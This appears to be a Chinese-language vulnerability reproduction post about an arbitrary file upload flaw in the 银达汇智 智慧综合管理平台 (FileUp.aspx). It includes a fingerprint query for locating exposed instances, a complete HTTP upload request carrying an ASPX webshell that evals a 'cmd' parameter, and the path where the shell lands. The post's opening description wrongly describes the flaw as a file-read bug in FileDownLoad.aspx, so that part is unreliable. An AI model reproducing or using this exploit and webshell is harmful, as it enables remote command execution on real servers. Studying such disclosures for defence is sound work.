---
title: "银达汇智 智慧综合管理平台 FileUp.aspx 任意文件上传漏洞"
date: 2026-10-16 09:11:46
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "银达汇智-智慧综合管理平台"
tags:
  - "银达汇智-智慧综合管理平台"
  - "任意文件读取"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件

## 漏洞影响

```
银达汇智 智慧综合管理平台
```

## 网络测绘

```
"汇智信息" && title=="智慧综合管理平台登入"
```

## 漏洞复现

登陆页面

![image-20220525150952244](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251514171.png)

文件上传请求包

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /Module/FileUpPage/FileUp.aspx?orgid=1&amp;type=NNewsContent HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 337
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=62907949903a4c499178971c9dab4ad9

--62907949903a4c499178971c9dab4ad9
Content-Disposition: form-data; name="Filedata"; filename="abc.aspx"
Content-Type: image/jpeg

&lt;%@ Page Language="Jscript"%&gt;&lt;%Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("abc", "MD5").ToLower());&#101;val(Request.Item["cmd"],"unsafe");%&gt;
--62907949903a4c499178971c9dab4ad9--</code></pre>

</details>

![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251514756.png)

响应包会返回文件名，上传的目录为

```
/imgnews/imgcontent/1/xxxxxxxxxx.aspx
```

![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251514939.png)

出现如图成功上传木马，密码为 `cmd`

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-FileUp.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
